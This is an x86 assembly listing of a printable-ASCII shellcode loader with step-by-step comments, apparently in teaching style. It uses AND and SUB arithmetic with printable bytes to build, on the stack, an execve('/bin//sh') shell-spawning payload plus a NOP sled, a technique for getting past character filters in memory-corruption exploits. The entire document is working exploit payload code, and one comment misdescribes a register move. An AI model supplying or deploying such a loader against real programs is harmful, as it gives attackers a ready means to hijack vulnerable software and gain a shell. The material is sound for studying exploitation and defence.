Section .text
global _start
_start:
BITS 32
and eax, 0x454e4f4a ; Zero out the EAX register
and eax, 0x3a313035 ; by ANDing opposing, but printable bits
push esp            ; Push ESP to the stack, and then
pop eax             ; pop that into EAX to do a mov eax, esp
sub eax, 0x39393333 ; Subtract various printable values
sub eax, 0x72727550 ; from EAX to wrap all the way around
sub eax, 0x54545421 ; to effectively add 860 to ESP
push eax            ; Push EAX to the stack, and then
pop esp             ; pop that into ESP to do a mov eax, esp
; Now ESP is 860 bytes further down (in higher memory addresses)
; which is past our loader bytecode that is executing now
and eax, 0x454e4f4a ; Zero out the EAX register again
and eax, 0x3a313035 ; using the same trick
sub eax, 0x344b4b74 ; Subtract some printable values
sub eax, 0x256e5867 ; from EAX to wrap EAX to 0x80cd0bb0
sub eax, 0x25795075 ; (took 3 instructions to get there)
push eax            ; and then push EAX to the stack
sub eax, 0x6e784a38 ; Subtract more printable values
sub eax, 0x78733825 ; from EAX to wrap EAX to 0x99e18953
push eax            ; and then push this to the stack
sub eax, 0x64646464 ; Subtract more printable values
sub eax, 0x6a373737 ; from EAX to wrap EAX to 0x51e3896e
sub eax, 0x7962644a ; (took 3 instructions to get there)
push eax            ; and then push EAX to the stack
sub eax, 0x55257555 ; Subtract more printable values
sub eax, 0x41367070 ; from EAX to wrap EAX to 0x69622f68
sub eax, 0x52257441 ; (took 3 instructions to get there)
push eax            ; and then push EAX to the stack
sub eax, 0x77777777 ; Subtract more printable values
sub eax, 0x33334f4f ; from EAX to wrap EAX to 0x68732f2f
sub eax, 0x56443973 ; (took 3 instructions to get there)
push eax            ; and then push EAX to the stack
sub eax, 0x254f2572 ; Subtract more printable values
sub eax, 0x65654477 ; from EAX to wrap EAX to 0x685180cd
sub eax, 0x756d4479 ; (took 3 instructions to get there)
push eax            ; and then push EAX to the stac
sub eax, 0x43434343 ; Subtract more printable values
sub eax, 0x25773025 ; from EAX to wrap EAX to 0xc931db31
sub eax, 0x36653234 ; (took 3 instructions to get there)
push eax            ; and then push EAX to the stack
sub eax, 0x387a3848 ; Subtract more printable values
sub eax, 0x38713859 ; from EAX to wrap EAX to 0x58466a90
push eax            ; and then push EAX to the stack
; add a NOP sled
sub eax, 0x6a346a6a ; Subtract more printable values
sub eax, 0x254c3964 ; from EAX to wrap EAX to 0x90909090
sub eax, 0x38353632 ; (took 3 instructions to get there)
push eax            ; and then push EAX to the stack
push eax            ; many times to build a NOP sled
push eax            ; to bridge the loader code to the
push eax            ; freshly built shellcode.
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
